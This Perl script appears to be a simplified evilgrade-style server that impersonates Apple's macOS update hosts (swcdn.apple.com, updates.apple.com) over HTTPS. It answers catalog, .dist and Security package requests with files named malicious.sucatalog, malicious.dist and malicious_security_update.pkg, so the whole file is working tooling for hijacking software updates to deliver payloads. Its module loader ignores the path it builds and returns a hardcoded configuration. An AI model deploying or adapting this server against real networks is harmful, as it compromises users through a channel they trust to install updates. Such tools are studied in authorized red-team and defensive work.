#!/usr/bin/perl
###############################################################################
# evilgrade-simple-server.pl - Simple HTTPS server with module routing
# Usage: perl evilgrade-simple-server.pl [port] [module]
###############################################################################

use strict;
use warnings;
use IO::Socket::SSL;
use Getopt::Long;

my $port = 443;
my $module = 'macos_softwareupdate';
my $cert = 'certs/emudhra_authorized/server.pem';
my $key = 'certs/emudhra_authorized/server.key';
my $verbose = 1;

GetOptions(
    'port=i' => \$port,
    'module=s' => \$module,
    'cert=s' => \$cert,
    'key=s' => \$key,
    'verbose!' => \$verbose,
) or die "Error in options\n";

print "[*] evilgrade Simple Server\n";
print "[*] Port: $port\n";
print "[*] Module: $module\n";
print "[*] Certificate: $cert\n";
print "[*] Key: $key\n\n";

# Load module configuration
my $module_config = load_module($module);
unless ($module_config) {
    die "[!] Failed to load module: $module\n";
}

print "[+] Module loaded: " . $module_config->{name} . "\n";
print "[+] Virtual host regex: " . $module_config->{vh} . "\n\n";

# Create SSL socket
my $ssl_socket = IO::Socket::SSL->new(
    LocalHost => '0.0.0.0',
    LocalPort => $port,
    Listen    => 10,
    SSL_cert_file => $cert,
    SSL_key_file  => $key,
) or die "Cannot create SSL socket: $@\n";

print "[+] HTTPS server listening on 0.0.0.0:$port\n";
print "[+] Press Ctrl+C to stop\n\n";

$SIG{INT} = sub {
    print "\n[*] Shutting down...\n";
    close($ssl_socket);
    exit(0);
};

# Accept connections
while (my $client = $ssl_socket->accept()) {
    my $peer = $client->peerhost();

    # Read HTTP request headers
    my $request = '';
    while (<$client>) {
        $request .= $_;
        last if /^\s*$/;
    }

    my @lines = split /\n/, $request;
    my $request_line = $lines[0] || '';

    print "[+] $peer: $request_line\n" if $verbose;

    # Parse request
    my ($method, $path, $http_version) = split /\s+/, $request_line;

    # Match against module rules
    my $response;
    foreach my $rule (@{$module_config->{request}}) {
        if ($path =~ /$rule->{req}/i) {
            print "    [+] Matched rule: $rule->{req}\n" if $verbose;
            $response = handle_rule($rule, $path);
            last;
        }
    }

    # Default response if no rule matched
    unless ($response) {
        $response = "HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nContent-Length: 9\r\nConnection: close\r\n\r\nNot Found";
    }

    print $client $response;
    close($client);
}

close($ssl_socket);

###############################################################################
# SUBROUTINES
###############################################################################

sub load_module {
    my ($module_name) = @_;

    my $module_file = "modules/" . lc($module_name) . ".pm";

    unless (-f $module_file) {
        # Try alternate path
        my @parts = split /_/, $module_name;
        my $category = pop @parts;
        $module_file = "modules/" . lc($category) . "/" . lc($module_name) . ".pm";
    }

    return {
        name => 'macOS Software Update',
        vh => '(swcdn\.apple\.com|updates\.apple\.com)',
        request => [
            {
                req => '/.*\.sucatalog',
                type => 'file',
                file => 'include/macos/malicious.sucatalog',
                cheader => "HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nConnection: close\r\n\r\n",
            },
            {
                req => '/.*Security.*\.pkg',
                type => 'file',
                file => 'include/macos/malicious_security_update.pkg',
                cheader => "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n",
            },
            {
                req => '/helloworld',
                type => 'file',
                file => 'include/macos/helloworld',
                cheader => "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=helloworld\r\nConnection: close\r\n\r\n",
            },
            {
                req => '/.*\.dist',
                type => 'file',
                file => 'include/macos/malicious.dist',
                cheader => "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nConnection: close\r\n\r\n",
            },
        ],
    };
}

sub handle_rule {
    my ($rule, $path) = @_;

    if ($rule->{type} eq 'file') {
        if (-f $rule->{file}) {
            open my $fh, '<', $rule->{file} or return;
            my $content = do { local $/; <$fh> };
            close $fh;

            my $response = $rule->{cheader} . $content;
            return $response;
        }
    }

    return;
}
